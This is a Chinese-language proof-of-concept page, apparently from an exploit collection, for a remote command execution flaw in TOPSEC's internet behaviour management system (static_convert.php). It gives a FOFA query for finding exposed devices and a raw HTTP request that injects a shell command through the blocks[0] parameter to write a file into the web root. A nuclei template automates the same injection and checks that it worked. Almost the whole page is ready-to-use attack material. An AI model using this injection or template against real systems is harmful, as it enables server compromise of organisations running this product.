## 天融信TOPSEC_static_convert远程命令执行漏洞

## fofa
```
app="天融信-上网行为管理系统"
```

## poc
```
GET /view/IPV6/naborTable/static_convert.php?blocks[0]=||%20%20echo%20'pstvamqlkzrgslfilwvf'%20>>%20/var/www/html/rrlmkkyopirhaviko.txt%0A HTTP/1.1
Host: 192.168.40.130:8443
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36

```

![46a8923aca7c87333e82efadd74cf08c](https://github.com/wy876/POC/assets/139549762/fed4855b-bedf-436b-ba41-9df02ee8ae6d)

## nuclei
```
id: topsec-static_convert-rce

info:
  name: 天融信TOPSEC static_convert 远程命令执行漏洞
  author: fgz
  severity: critical
  description: 天融信TOPSEC解决方案包括综合管理系统，各类安全产品如防火墙、VPN、安全网关、宽带管理、入侵检测、内容过滤、个人安全套件以及综合安全审计系统等多种安全功能。该系统static_convert.php接口处存在RCE漏洞，会导致服务器失陷。
  metadata:
    max-request: 1
    fofa-query: app="天融信-上网行为管理系统"
    verified: true
variables:
  file_name: "{{to_lower(rand_text_alpha(6))}}"
  file_content: "{{to_lower(rand_text_alpha(15))}}"
requests:
  - raw:
      - |+
        GET /view/IPV6/naborTable/static_convert.php?blocks[0]=||%20%20echo%20'{{file_content}}'%20>>%20/var/www/html/{{file_name}}.txt%0A HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36

      - |
        GET /{{file_name}}.txt HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36

    matchers:
      - type: dsl
        dsl:
          - "status_code_1 == 200 && status_code_2 == 200 && contains(body_2, '{{file_content}}')"
```
